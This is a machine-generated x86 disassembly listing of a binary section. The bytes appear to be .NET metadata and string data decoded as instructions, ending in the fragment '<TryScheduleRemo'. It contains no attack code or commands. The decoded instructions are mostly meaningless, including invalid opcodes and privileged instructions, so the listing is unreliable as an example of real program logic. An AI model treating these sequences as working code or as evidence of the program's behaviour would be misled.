  4053e3:	01 a9 01 ec 12 29    	add    %ebp,0x2912ec01(%ecx)
  4053e9:	01 a9 01 2b 0b 36    	add    %ebp,0x360b2b01(%ecx)
  4053ef:	01 29                	add    %ebp,(%ecx)
  4053f1:	01 30                	add    %esi,(%eax)
  4053f3:	14 52                	adc    $0x52,%al
  4053f5:	01 f9                	add    %edi,%ecx
  4053f7:	00 4a 0f             	add    %cl,0xf(%edx)
  4053fa:	57                   	push   %edi
  4053fb:	01 f9                	add    %edi,%ecx
  4053fd:	00 ec                	add    %ch,%ah
  4053ff:	12 06                	adc    (%esi),%al
  405401:	00 49 02             	add    %cl,0x2(%ecx)
  405404:	4b                   	dec    %ebx
  405405:	0a 50 00             	or     0x0(%eax),%dl
  405408:	91                   	xchg   %eax,%ecx
  405409:	02 ac 06 19 01 f9 00 	add    0xf90119(%esi,%eax,1),%ch
  405410:	a1 12 5f 01 01       	mov    0x1015f12,%eax
  405415:	01 ca                	add    %ecx,%edx
  405417:	0b 65 01             	or     0x1(%ebp),%esp
  40541a:	99                   	cltd
  40541b:	02 af 02 6b 01 11    	add    0x11016b02(%edi),%ch
  405421:	01 4a 0f             	add    %ecx,0xf(%edx)
  405424:	71 01                	jno    0x405427
  405426:	19 01                	sbb    %eax,(%ecx)
  405428:	4a                   	dec    %edx
  405429:	0f 71                	(bad)
  40542b:	01 19                	add    %ebx,(%ecx)
  40542d:	01 68 0a             	add    %ebp,0xa(%eax)
  405430:	15 00 a9 02 a3       	adc    $0xa302a900,%eax
  405435:	06                   	push   %es
  405436:	50                   	push   %eax
  405437:	00 19                	add    %bl,(%ecx)
  405439:	02 0e                	add    (%esi),%cl
  40543b:	12 ce                	adc    %dh,%cl
  40543d:	00 19                	add    %bl,(%ecx)
  40543f:	02 17                	add    (%edi),%dl
  405441:	05 d4 00 b1 02       	add    $0x2b100d4,%eax
  405446:	ac                   	lods   %ds:(%esi),%al
  405447:	06                   	push   %es
  405448:	10 00                	adc    %al,(%eax)
  40544a:	21 01                	and    %eax,(%ecx)
  40544c:	61                   	popa
  40544d:	05 50 00 f9 00       	add    $0xf90050,%eax
  405452:	a1 0d 06 00 b9       	mov    0xb900060d,%eax
  405457:	02 4a 0f             	add    0xf(%edx),%cl
  40545a:	86 01                	xchg   %al,(%ecx)
  40545c:	b9 02 69 13 15       	mov    $0x15136902,%ecx
  405461:	00 b9 02 e8 0e 15    	add    %bh,0x150ee802(%ecx)
  405467:	00 b9 02 73 09 15    	add    %bh,0x15097302(%ecx)
  40546d:	00 b9 02 ba 13 15    	add    %bh,0x1513ba02(%ecx)
  405473:	00 b9 00 ec 12 8c    	add    %bh,-0x73ed1400(%ecx)
  405479:	01 b9 00 56 13 94    	add    %edi,-0x6becaa00(%ecx)
  40547f:	01 a9 02 ba 04 50    	add    %ebp,0x5004ba02(%ecx)
  405485:	00 b9 00 d6 0e 94    	add    %bh,-0x6bf12a00(%ecx)
  40548b:	01 b9 00 81 12 06    	add    %edi,0x6128100(%ecx)
  405491:	00 c1                	add    %al,%cl
  405493:	02 60 06             	add    0x6(%eax),%ah
  405496:	f7 00 c1 02 57 14    	testl  $0x145702c1,(%eax)
  40549c:	ab                   	stos   %eax,%es:(%edi)
  40549d:	01 c9                	add    %ecx,%ecx
  40549f:	02 06                	add    (%esi),%al
  4054a1:	13 b2 01 29 01 0a    	adc    0xa012901(%edx),%esi
  4054a7:	14 b9                	adc    $0xb9,%al
  4054a9:	01 19                	add    %ebx,(%ecx)
  4054ab:	02 7b 12             	add    0x12(%ebx),%bh
  4054ae:	bf 01 19 02 15       	mov    $0x15021901,%edi
  4054b3:	12 c6                	adc    %dh,%al
  4054b5:	01 31                	add    %esi,(%ecx)
  4054b7:	01 4a 0f             	add    %ecx,0xf(%edx)
  4054ba:	06                   	push   %es
  4054bb:	00 31                	add    %dh,(%ecx)
  4054bd:	01 db                	add    %ebx,%ebx
  4054bf:	04 d8                	add    $0xd8,%al
  4054c1:	01 39                	add    %edi,(%ecx)
  4054c3:	01 03                	add    %eax,(%ebx)
  4054c5:	12 e0                	adc    %al,%ah
  4054c7:	01 14 00             	add    %edx,(%eax,%eax,1)
  4054ca:	4d                   	dec    %ebp
  4054cb:	07                   	pop    %es
  4054cc:	f2 01 14 00          	repnz add %edx,(%eax,%eax,1)
  4054d0:	ec                   	in     (%dx),%al
  4054d1:	12 29                	adc    (%ecx),%ch
  4054d3:	01 14 00             	add    %edx,(%eax,%eax,1)
  4054d6:	2b 0b                	sub    (%ebx),%ecx
  4054d8:	01 02                	add    %eax,(%edx)
  4054da:	d9 00                	flds   (%eax)
  4054dc:	4a                   	dec    %edx
  4054dd:	0f 06                	clts
  4054df:	00 c9                	add    %cl,%cl
  4054e1:	01 4a 0f             	add    %ecx,0xf(%edx)
  4054e4:	77 00                	ja     0x4054e6
  4054e6:	59                   	pop    %ecx
  4054e7:	02 4a 0f             	add    0xf(%edx),%cl
  4054ea:	15 02 59 02 e4       	adc    $0xe4025902,%eax
  4054ef:	04 15                	add    $0x15,%al
  4054f1:	00 59 02             	add    %bl,0x2(%ecx)
  4054f4:	ec                   	in     (%dx),%al
  4054f5:	12 06                	adc    (%esi),%al
  4054f7:	00 d9                	add    %bl,%cl
  4054f9:	00 88 13 23 02 19    	add    %cl,0x19022313(%eax)
  4054ff:	02 12                	add    (%edx),%dl
  405501:	0b 29                	or     (%ecx),%ebp
  405503:	02 d9                	add    %cl,%bl
  405505:	00 88 13 2d 02 19    	add    %cl,0x19022d13(%eax)
  40550b:	02 60 11             	add    0x11(%eax),%ah
  40550e:	32 02                	xor    (%edx),%al
  405510:	19 02                	sbb    %eax,(%edx)
  405512:	4a                   	dec    %edx
  405513:	0f 37                	getsec
  405515:	02 89 02 34 14 0c    	add    0xc143402(%ecx),%cl
  40551b:	01 89 02 8f 10 40    	add    %ecx,0x40108f02(%ecx)
  405521:	02 41 02             	add    0x2(%ecx),%al
  405524:	56                   	push   %esi
  405525:	0e                   	push   %cs
  405526:	9c                   	pushf
  405527:	00 c1                	add    %al,%cl
  405529:	00 f3                	add    %dh,%bl
  40552b:	13 4d 02             	adc    0x2(%ebp),%ecx
  40552e:	c1 00 9a             	roll   $0x9a,(%eax)
  405531:	09 54 02 b9          	or     %edx,-0x47(%edx,%eax,1)
  405535:	02 e2                	add    %dl,%ah
  405537:	05 5f 02 71 02       	add    $0x271025f,%eax
  40553c:	48                   	dec    %eax
  40553d:	10 71 02             	adc    %dh,0x2(%ecx)
  405540:	19 02                	sbb    %eax,(%edx)
  405542:	e7 10                	out    %eax,$0x10
  405544:	78 02                	js     0x405548
  405546:	01 03                	add    %eax,(%ebx)
  405548:	db 12                	fistl  (%edx)
  40554a:	80 02 09             	addb   $0x9,(%edx)
  40554d:	03 4a 0f             	add    0xf(%edx),%ecx
  405550:	86 02                	xchg   %al,(%edx)
  405552:	09 03                	or     %eax,(%ebx)
  405554:	a1 05 8d 02 d9       	mov    0xd9028d05,%eax
  405559:	01 4a 0f             	add    %ecx,0xf(%edx)
  40555c:	10 00                	adc    %al,(%eax)
  40555e:	d9 01                	flds   (%ecx)
  405560:	12 0b                	adc    (%ebx),%cl
  405562:	b5 00                	mov    $0x0,%ch
  405564:	b9 00 ec 12 9f       	mov    $0x9f12ec00,%ecx
  405569:	02 79 02             	add    0x2(%ecx),%bh
  40556c:	88 12                	mov    %dl,(%edx)
  40556e:	b0 00                	mov    $0x0,%al
  405570:	89 02                	mov    %eax,(%edx)
  405572:	34 14                	xor    $0x14,%al
  405574:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405575:	02 69 02             	add    0x2(%ecx),%ch
  405578:	bb 0a ec 00 19       	mov    $0x1900ec0a,%ebx
  40557d:	02 b2 04 ac 02 19    	add    0x1902ac04(%edx),%dh
  405583:	02 e7                	add    %bh,%ah
  405585:	10 b2 02 e1 01 4a    	adc    %dh,0x4a01e102(%edx)
  40558b:	0f 06                	clts
  40558d:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405590:	4a                   	dec    %edx
  405591:	0f 77                	emms
  405593:	00 e1                	add    %ah,%cl
  405595:	01 2a                	add    %ebp,(%edx)
  405597:	0c c3                	or     $0xc3,%al
  405599:	02 f1                	add    %cl,%dh
  40559b:	00 3d 0d c9 02 e1    	add    %bh,0xe102c90d
  4055a1:	01 86 0b 06 00 91    	add    %eax,-0x6efff9f5(%esi)
  4055a7:	02 aa 0e e2 02 91    	add    -0x6efd1df2(%edx),%ch
  4055ad:	02 cb                	add    %bl,%cl
  4055af:	0e                   	push   %cs
  4055b0:	e9 02 21 03 91       	jmp    0x914376b7
  4055b5:	0e                   	push   %cs
  4055b6:	00 03                	add    %al,(%ebx)
  4055b8:	21 03                	and    %eax,(%ebx)
  4055ba:	88 12                	mov    %dl,(%edx)
  4055bc:	07                   	pop    %es
  4055bd:	03 09                	add    (%ecx),%ecx
  4055bf:	02 9d 10 1e 03 09    	add    0x9031e10(%ebp),%bl
  4055c5:	02 e7                	add    %bh,%ah
  4055c7:	13 59 00             	adc    0x0(%ecx),%ebx
  4055ca:	09 02                	or     %eax,(%edx)
  4055cc:	15 07 25 03 09       	adc    $0x9032507,%eax
  4055d1:	02 39                	add    (%ecx),%bh
  4055d3:	14 2b                	adc    $0x2b,%al
  4055d5:	03 39                	add    (%ecx),%edi
  4055d7:	03 43 06             	add    0x6(%ebx),%eax
  4055da:	50                   	push   %eax
  4055db:	00 99 00 4a 0f 06    	add    %bl,0x60f4a00(%ecx)
  4055e1:	00 51 01             	add    %dl,0x1(%ecx)
  4055e4:	4a                   	dec    %edx
  4055e5:	0f 06                	clts
  4055e7:	00 51 01             	add    %dl,0x1(%ecx)
  4055ea:	8d 06                	lea    (%esi),%eax
  4055ec:	10 00                	adc    %al,(%eax)
  4055ee:	51                   	push   %ecx
  4055ef:	01 0a                	add    %ecx,(%edx)
  4055f1:	05 10 00 51 01       	add    $0x1510010,%eax
  4055f6:	7c 0c                	jl     0x405604
  4055f8:	4e                   	dec    %esi
  4055f9:	03 51 01             	add    0x1(%ecx),%edx
  4055fc:	15 10 15 00 51       	adc    $0x51001510,%eax
  405601:	01 4b 0c             	add    %ecx,0xc(%ebx)
  405604:	55                   	push   %ebp
  405605:	03 51 03             	add    0x3(%ecx),%edx
  405608:	72 0f                	jb     0x405619
  40560a:	5c                   	pop    %esp
  40560b:	03 59 03             	add    0x3(%ecx),%ebx
  40560e:	42                   	inc    %edx
  40560f:	13 63 03             	adc    0x3(%ebx),%esp
  405612:	59                   	pop    %ecx
  405613:	01 4a 0f             	add    %ecx,0xf(%edx)
  405616:	6a 03                	push   $0x3
  405618:	59                   	pop    %ecx
  405619:	01 42 12             	add    %eax,0x12(%edx)
  40561c:	06                   	push   %es
  40561d:	00 59 01             	add    %bl,0x1(%ecx)
  405620:	57                   	push   %edi
  405621:	04 59                	add    $0x59,%al
  405623:	00 61 03             	add    %ah,0x3(%ecx)
  405626:	4a                   	dec    %edx
  405627:	0f 10 00             	movups (%eax),%xmm0
  40562a:	61                   	popa
  40562b:	01 4a 0f             	add    %ecx,0xf(%edx)
  40562e:	72 03                	jb     0x405633
  405630:	71 03                	jno    0x405635
  405632:	9c                   	pushf
  405633:	11 7f 03             	adc    %edi,0x3(%edi)
  405636:	69 01 e5 0b 54 02    	imul   $0x2540be5,(%ecx),%eax
  40563c:	71 03                	jno    0x405641
  40563e:	f5                   	cmc
  40563f:	04 86                	add    $0x86,%al
  405641:	03 69 01             	add    0x1(%ecx),%ebp
  405644:	39 10                	cmp    %edx,(%eax)
  405646:	93                   	xchg   %eax,%ebx
  405647:	03 81 03 dc 0b 99    	add    -0x66f423fd(%ecx),%eax
  40564d:	03 89 03 87 09 a0    	add    -0x5ff678fd(%ecx),%ecx
  405653:	03 91 03 4b 0a 50    	add    0x500a4b03(%ecx),%edx
  405659:	00 19                	add    %bl,(%ecx)
  40565b:	02 0e                	add    (%esi),%cl
  40565d:	12 a4 03 01 01 4a 0f 	adc    0xf4a0101(%ebx,%eax,1),%ah
  405664:	06                   	push   %es
  405665:	00 01                	add    %al,(%ecx)
  405667:	01 9b 03 c5 03 f1    	add    %ebx,-0xefc3afd(%ebx)
  40566d:	00 e1                	add    %ah,%cl
  40566f:	13 cc                	adc    %esp,%ecx
  405671:	03 f1                	add    %ecx,%esi
  405673:	00 2c 14             	add    %ch,(%esp,%edx,1)
  405676:	d2 03                	rolb   %cl,(%ebx)
  405678:	24 00                	and    $0x0,%al
  40567a:	6e                   	outsb  %ds:(%esi),(%dx)
  40567b:	0e                   	push   %cs
  40567c:	e7 03                	out    %eax,$0x3
  40567e:	2c 00                	sub    $0x0,%al
  405680:	7e 04                	jle    0x405686
  405682:	59                   	pop    %ecx
  405683:	00 14 00             	add    %dl,(%eax,%eax,1)
  405686:	67 04 f9             	addr16 add $0xf9,%al
  405689:	03 2c 00             	add    (%eax,%eax,1),%ebp
  40568c:	8d 12                	lea    (%edx),%edx
  40568e:	10 04 01             	adc    %al,(%ecx,%eax,1)
  405691:	01 49 04             	add    %ecx,0x4(%ecx)
  405694:	59                   	pop    %ecx
  405695:	00 14 00             	add    %dl,(%eax,%eax,1)
  405698:	1f                   	pop    %ds
  405699:	0d 15 04 14 00       	or     $0x140415,%eax
  40569e:	97                   	xchg   %eax,%edi
  40569f:	12 1c 04             	adc    (%esp,%eax,1),%bl
  4056a2:	14 00                	adc    $0x0,%al
  4056a4:	d1 06                	roll   $1,(%esi)
  4056a6:	26 00 49 01          	add    %cl,%es:0x1(%ecx)
  4056aa:	4a                   	dec    %edx
  4056ab:	0f 77                	emms
  4056ad:	00 f1                	add    %dh,%cl
  4056af:	00 3d 0d 2d 04 71    	add    %bh,0x71042d0d
  4056b5:	01 4a 0f             	add    %ecx,0xf(%edx)
  4056b8:	01 00                	add    %eax,(%eax)
  4056ba:	34 00                	xor    $0x0,%al
  4056bc:	4a                   	dec    %edx
  4056bd:	0f 06                	clts
  4056bf:	00 19                	add    %bl,(%ecx)
  4056c1:	02 15 12 3d 04 71    	add    0x71043d12,%dl
  4056c7:	01 a8 03 36 01 f1    	add    %ebp,-0xefec9fd(%eax)
  4056cd:	00 6e 0e             	add    %ch,0xe(%esi)
  4056d0:	44                   	inc    %esp
  4056d1:	04 91                	add    $0x91,%al
  4056d3:	01 7e 04             	add    %edi,0x4(%esi)
  4056d6:	59                   	pop    %ecx
  4056d7:	00 a9 01 67 04 f9    	add    %ch,-0x6fb98ff(%ecx)
  4056dd:	03 91 01 8d 12 06    	add    0x6128d01(%ecx),%edx
  4056e3:	00 f1                	add    %dh,%cl
  4056e5:	00 3d 0d 52 04 34    	add    %bh,0x3404520d
  4056eb:	00 0d 04 1c 04 f1    	add    %cl,0xf1041c04
  4056f1:	00 b4 0b 5e 04 a9 01 	add    %dh,0x1a9045e(%ebx,%ecx,1)
  4056f8:	1f                   	pop    %ds
  4056f9:	0d 15 04 a9 01       	or     $0x1a90415,%eax
  4056fe:	97                   	xchg   %eax,%edi
  4056ff:	12 06                	adc    (%esi),%al
  405701:	00 a9 01 d1 06 26    	add    %ch,0x2606d101(%ecx)
  405707:	00 01                	add    %al,(%ecx)
  405709:	01 3f                	add    %edi,(%edi)
  40570b:	07                   	pop    %es
  40570c:	06                   	push   %es
  40570d:	00 01                	add    %al,(%ecx)
  40570f:	01 45 07             	add    %eax,0x7(%ebp)
  405712:	06                   	push   %es
  405713:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405716:	6e                   	outsb  %ds:(%esi),(%dx)
  405717:	0e                   	push   %cs
  405718:	e7 03                	out    %eax,$0x3
  40571a:	44                   	inc    %esp
  40571b:	00 7e 04             	add    %bh,0x4(%esi)
  40571e:	59                   	pop    %ecx
  40571f:	00 44 00 8d          	add    %al,-0x73(%eax,%eax,1)
  405723:	12 10                	adc    (%eax),%dl
  405725:	04 71                	add    $0x71,%al
  405727:	01 37                	add    %esi,(%edi)
  405729:	07                   	pop    %es
  40572a:	29 02                	sub    %eax,(%edx)
  40572c:	99                   	cltd
  40572d:	03 2f                	add    (%edi),%ebp
  40572f:	07                   	pop    %es
  405730:	fc                   	cld
  405731:	04 99                	add    $0x99,%al
  405733:	03 cd                	add    %ebp,%ecx
  405735:	13 06                	adc    (%esi),%eax
  405737:	00 f1                	add    %dh,%cl
  405739:	00 e1                	add    %ah,%cl
  40573b:	13 1a                	adc    (%edx),%ebx
  40573d:	05 f1 01 af 13       	add    $0x13af01f1,%eax
  405742:	2b 05 f1 01 7e 0f    	sub    0xf7e01f1,%eax
  405748:	31 05 19 02 15 12    	xor    %eax,0x12150219
  40574e:	38 05 f1 00 b4 0b    	cmp    %al,0xbb400f1
  405754:	3e 05 f1 01 15 0c    	ds add $0xc1501f1,%eax
  40575a:	46                   	inc    %esi
  40575b:	05 e1 01 8e 04       	add    $0x48e01e1,%eax
  405760:	59                   	pop    %ecx
  405761:	00 01                	add    %al,(%ecx)
  405763:	02 8e 04 59 00 08    	add    0x8005904(%esi),%cl
  405769:	00 14 00             	add    %dl,(%eax,%eax,1)
  40576c:	7a 05                	jp     0x405773
  40576e:	08 00                	or     %al,(%eax)
  405770:	18 00                	sbb    %al,(%eax)
  405772:	7f 05                	jg     0x405779
  405774:	27                   	daa
  405775:	00 83 00 68 08 2e    	add    %al,0x2e086800(%ebx)
  40577b:	00 0b                	add    %cl,(%ebx)
  40577d:	00 d2                	add    %dl,%dl
  40577f:	06                   	push   %es
  405780:	2e 00 13             	add    %dl,%cs:(%ebx)
  405783:	00 db                	add    %bl,%bl
  405785:	06                   	push   %es
  405786:	2e 00 1b             	add    %bl,%cs:(%ebx)
  405789:	00 fa                	add    %bh,%dl
  40578b:	06                   	push   %es
  40578c:	2e 00 23             	add    %ah,%cs:(%ebx)
  40578f:	00 03                	add    %al,(%ebx)
  405791:	07                   	pop    %es
  405792:	2e 00 2b             	add    %ch,%cs:(%ebx)
  405795:	00 03                	add    %al,(%ebx)
  405797:	07                   	pop    %es
  405798:	2e 00 33             	add    %dh,%cs:(%ebx)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	07                   	pop    %es
  40579e:	2e 00 3b             	add    %bh,%cs:(%ebx)
  4057a1:	00 19                	add    %bl,(%ecx)
  4057a3:	07                   	pop    %es
  4057a4:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  4057a8:	03 07                	add    (%edi),%eax
  4057aa:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  4057ae:	25 07 2e 00 53       	and    $0x53002e07,%eax
  4057b3:	00 13                	add    %dl,(%ebx)
  4057b5:	07                   	pop    %es
  4057b6:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  4057ba:	13 07                	adc    (%edi),%eax
  4057bc:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4057c0:	46                   	inc    %esi
  4057c1:	07                   	pop    %es
  4057c2:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4057c6:	70 07                	jo     0x4057cf
  4057c8:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  4057cc:	7d 07                	jge    0x4057d5
  4057ce:	63 01                	arpl   %eax,(%ecx)
  4057d0:	8b 00                	mov    (%eax),%eax
  4057d2:	68 08 80 01 93       	push   $0x93018008
  4057d7:	00 cb                	add    %cl,%bl
  4057d9:	07                   	pop    %es
  4057da:	83 01 8b             	addl   $0xffffff8b,(%ecx)
  4057dd:	00 68 08             	add    %ch,0x8(%eax)
  4057e0:	a3 01 8b 00 68       	mov    %eax,0x68008b01
  4057e5:	08 c3                	or     %al,%bl
  4057e7:	01 8b 00 68 08 e3    	add    %ecx,-0x1cf79800(%ebx)
  4057ed:	01 8b 00 68 08 03    	add    %ecx,0x3086800(%ebx)
  4057f3:	02 8b 00 68 08 20    	add    0x20086800(%ebx),%cl
  4057f9:	02 93 00 f7 07 23    	add    0x2307f700(%ebx),%dl
  4057ff:	02 8b 00 68 08 40    	add    0x40086800(%ebx),%cl
  405805:	02 93 00 27 08 43    	add    0x43082700(%ebx),%dl
  40580b:	02 8b 00 68 08 63    	add    0x63086800(%ebx),%cl
  405811:	02 8b 00 68 08 83    	add    -0x7cf79800(%ebx),%cl
  405817:	02 8b 00 68 08 a3    	add    -0x5cf79800(%ebx),%cl
  40581d:	02 8b 00 68 08 c3    	add    -0x3cf79800(%ebx),%cl
  405823:	02 8b 00 68 08 e3    	add    -0x1cf79800(%ebx),%cl
  405829:	02 8b 00 68 08 03    	add    0x3086800(%ebx),%cl
  40582f:	03 8b 00 68 08 80    	add    -0x7ff79800(%ebx),%ecx
  405835:	03 b3 00 68 08 60    	add    0x60086800(%ebx),%esi
  40583b:	04 93                	add    $0x93,%al
  40583d:	00 6d 08             	add    %ch,0x8(%ebp)
  405840:	00 05 93 00 a2 08    	add    %al,0x8a20093
  405846:	e0 06                	loopne 0x40584e
  405848:	93                   	xchg   %eax,%ebx
  405849:	00 d2                	add    %dl,%dl
  40584b:	08 20                	or     %ah,(%eax)
  40584d:	07                   	pop    %es
  40584e:	ab                   	stos   %eax,%es:(%edi)
  40584f:	00 68 08             	add    %ch,0x8(%eax)
  405852:	60                   	pusha
  405853:	07                   	pop    %es
  405854:	ab                   	stos   %eax,%es:(%edi)
  405855:	00 68 08             	add    %ch,0x8(%eax)
  405858:	a0 07 ab 00 68       	mov    0x6800ab07,%al
  40585d:	08 60 08             	or     %ah,0x8(%eax)
  405860:	93                   	xchg   %eax,%ebx
  405861:	00 16                	add    %dl,(%esi)
  405863:	09 a0 08 ab 00 68    	or     %esp,0x6800ab08(%eax)
  405869:	08 00                	or     %al,(%eax)
  40586b:	09 93 00 42 09 80    	or     %edx,-0x7ff6be00(%ebx)
  405871:	09 ab 00 68 08 c0    	or     %ebp,-0x3ff79800(%ebx)
  405877:	09 ab 00 68 08 00    	or     %ebp,0x86800(%ebx)
  40587d:	0a ab 00 68 08 40    	or     0x40086800(%ebx),%ch
  405883:	0a ab 00 68 08 08    	or     0x8086800(%ebx),%ch
  405889:	00 06                	add    %al,(%esi)
  40588b:	00 84 05 31 00 5d 00 	add    %al,0x5d0031(%ebp,%eax,1)
  405892:	95                   	xchg   %eax,%ebp
  405893:	00 a6 00 b9 00 d9    	add    %ah,-0x26ff4700(%esi)
  405899:	00 e4                	add    %ah,%ah
  40589b:	00 1e                	add    %bl,(%esi)
  40589d:	01 3b                	add    %edi,(%ebx)
  40589f:	01 7b 01             	add    %edi,0x1(%ebx)
  4058a2:	9a 01 ce 01 e6 01 0b 	lcall  $0xb01,$0xe601ce01
  4058a9:	02 1c 02             	add    (%edx,%eax,1),%bl
  4058ac:	3d 02 48 02 5a       	cmp    $0x5a024802,%eax
  4058b1:	02 66 02             	add    0x2(%esi),%ah
  4058b4:	94                   	xchg   %eax,%esp
  4058b5:	02 d8                	add    %al,%bl
  4058b7:	02 ed                	add    %ch,%ch
  4058b9:	02 f7                	add    %bh,%dh
  4058bb:	02 0c 03             	add    (%ebx,%eax,1),%cl
  4058be:	31 03                	xor    %eax,(%ebx)
  4058c0:	3b 03                	cmp    (%ebx),%eax
  4058c2:	ac                   	lods   %ds:(%esi),%al
  4058c3:	03 b6 03 22 04 6a    	add    0x6a042203(%esi),%esi
  4058c9:	04 7c                	add    $0x7c,%al
  4058cb:	04 86                	add    $0x86,%al
  4058cd:	04 a2                	add    $0xa2,%al
  4058cf:	04 ac                	add    $0xac,%al
  4058d1:	04 c3                	add    $0xc3,%al
  4058d3:	04 05                	add    $0x5,%al
  4058d5:	05 50 05 10 00       	add    $0x100550,%eax
  4058da:	70 00                	jo     0x4058dc
  4058dc:	27                   	daa
  4058dd:	00 10                	add    %dl,(%eax)
  4058df:	00 72 00             	add    %dh,0x0(%edx)
  4058e2:	29 00                	sub    %eax,(%eax)
  4058e4:	11 00                	adc    %eax,(%eax)
  4058e6:	74 00                	je     0x4058e8
  4058e8:	27                   	daa
  4058e9:	00 11                	add    %dl,(%ecx)
  4058eb:	00 76 00             	add    %dh,0x0(%esi)
  4058ee:	29 00                	sub    %eax,(%eax)
  4058f0:	12 00                	adc    (%eax),%al
  4058f2:	78 00                	js     0x4058f4
  4058f4:	27                   	daa
  4058f5:	00 12                	add    %dl,(%edx)
  4058f7:	00 7a 00             	add    %bh,0x0(%edx)
  4058fa:	29 00                	sub    %eax,(%eax)
  4058fc:	15 00 88 00 27       	adc    $0x27008800,%eax
  405901:	00 15 00 8a 00 29    	add    %dl,0x29008a00
  405907:	00 18                	add    %bl,(%eax)
  405909:	00 96 00 27 00 18    	add    %dl,0x18002700(%esi)
  40590f:	00 98 00 29 00 19    	add    %bl,0x19002900(%eax)
  405915:	00 9a 00 27 00 19    	add    %bl,0x19002700(%edx)
  40591b:	00 9c 00 29 00 1a 00 	add    %bl,0x1a0029(%eax,%eax,1)
  405922:	9e                   	sahf
  405923:	00 27                	add    %ah,(%edi)
  405925:	00 1a                	add    %bl,(%edx)
  405927:	00 a0 00 29 00 1b    	add    %ah,0x1b002900(%eax)
  40592d:	00 a2 00 27 00 1b    	add    %ah,0x1b002700(%edx)
  405933:	00 a4 00 29 00 6f 00 	add    %ah,0x6f0029(%eax,%eax,1)
  40593a:	eb 01                	jmp    0x40593d
  40593c:	bb 02 df 03 f1       	mov    $0xf103df02,%ebx
  405941:	03 35 04 db 04 e2    	add    0xe204db04,%esi
  405947:	04 04                	add    $0x4,%al
  405949:	80 00 00             	addb   $0x0,(%eax)
  40594c:	01 00                	add    %eax,(%eax)
	...
  40595a:	0a 0c 00             	or     (%eax,%eax,1),%cl
  40595d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  405968:	00 00                	add    %al,(%eax)
  40596a:	68 05 0f 03 00       	push   $0x30f05
  40596f:	00 00                	add    %al,(%eax)
  405971:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40597c:	00 00                	add    %al,(%eax)
  40597e:	71 05                	jno    0x405985
  405980:	b1 12                	mov    $0x12,%cl
  405982:	00 00                	add    %al,(%eax)
  405984:	00 00                	add    %al,(%eax)
  405986:	04 00                	add    $0x0,%al
	...
  405990:	00 00                	add    %al,(%eax)
  405992:	68 05 ee 0b 00       	push   $0xbee05
  405997:	00 00                	add    %al,(%eax)
  405999:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4059a4:	00 00                	add    %al,(%eax)
  4059a6:	68 05 23 07 00       	push   $0x72305
  4059ab:	00 00                	add    %al,(%eax)
  4059ad:	00 0b                	add    %cl,(%ebx)
  4059af:	00 02                	add    %al,(%edx)
  4059b1:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4059b4:	04 00                	add    $0x0,%al
  4059b6:	0d 00 04 00 0e       	or     $0xe000400,%eax
  4059bb:	00 04 00             	add    %al,(%eax,%eax,1)
  4059be:	0f 00 04 00          	sldt   (%eax,%eax,1)
  4059c2:	10 00                	adc    %al,(%eax)
  4059c4:	04 00                	add    $0x0,%al
  4059c6:	11 00                	adc    %eax,(%eax)
  4059c8:	04 00                	add    $0x0,%al
  4059ca:	12 00                	adc    (%eax),%al
  4059cc:	04 00                	add    $0x0,%al
  4059ce:	13 00                	adc    (%eax),%eax
  4059d0:	05 00 14 00 08       	add    $0x8001400,%eax
  4059d5:	00 15 00 08 00 16    	add    %dl,0x16000800
  4059db:	00 09                	add    %cl,(%ecx)
  4059dd:	00 17                	add    %dl,(%edi)
  4059df:	00 09                	add    %cl,(%ecx)
  4059e1:	00 18                	add    %bl,(%eax)
  4059e3:	00 09                	add    %cl,(%ecx)
  4059e5:	00 19                	add    %bl,(%ecx)
  4059e7:	00 0f                	add    %cl,(%edi)
  4059e9:	00 1a                	add    %bl,(%edx)
  4059eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4059ee:	1b 00                	sbb    (%eax),%eax
  4059f0:	16                   	push   %ss
  4059f1:	00 4d 00             	add    %cl,0x0(%ebp)
  4059f4:	91                   	xchg   %eax,%ecx
  4059f5:	00 7f 00             	add    %bh,0x0(%edi)
  4059f8:	31 01                	xor    %eax,(%ecx)
  4059fa:	cd 00                	int    $0x0
  4059fc:	fc                   	cld
  4059fd:	01 7f 00             	add    %edi,0x0(%edi)
  405a00:	10 02                	adc    %al,(%edx)
  405a02:	7f 00                	jg     0x405a04
  405a04:	dd 02                	fldl   (%edx)
  405a06:	7f 00                	jg     0x405a08
  405a08:	f2 02 7f 00          	repnz add 0x0(%edi),%bh
  405a0c:	b1 03                	mov    $0x3,%cl
  405a0e:	5f                   	pop    %edi
  405a0f:	01 04 04             	add    %eax,(%esp,%eax,1)
  405a12:	7b 01                	jnp    0x405a15
  405a14:	4a                   	dec    %edx
  405a15:	04 7b                	add    $0x7b,%al
  405a17:	01 74 04 7f          	add    %esi,0x7f(%esp,%eax,1)
  405a1b:	00 81 04 7b 01 96    	add    %al,-0x69fe84fc(%ecx)
  405a21:	04 7f                	add    $0x7f,%al
  405a23:	00 a7 04 7b 01 bb    	add    %ah,-0x44fe84fc(%edi)
  405a29:	04 7b                	add    $0x7b,%al
  405a2b:	01 e9                	add    %ebp,%ecx
  405a2d:	04 7b                	add    $0x7b,%al
  405a2f:	01 f4                	add    %esi,%esp
  405a31:	04 7b                	add    $0x7b,%al
  405a33:	01 23                	add    %esp,(%ebx)
  405a35:	05 7b 01 60 05       	add    $0x560017b,%eax
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	00 3c 54             	add    %bh,(%esp,%edx,2)
  405a3f:	72 79                	jb     0x405aba
  405a41:	53                   	push   %ebx
  405a42:	63 68 65             	arpl   %ebp,0x65(%eax)
  405a45:	64 75 6c             	fs jne 0x405ab4
  405a48:	65 52                	gs push %edx
  405a4a:	65 6d                	gs insl (%dx),%es:(%edi)
  405a4c:	6f                   	outsl  %ds:(%esi),(%dx)
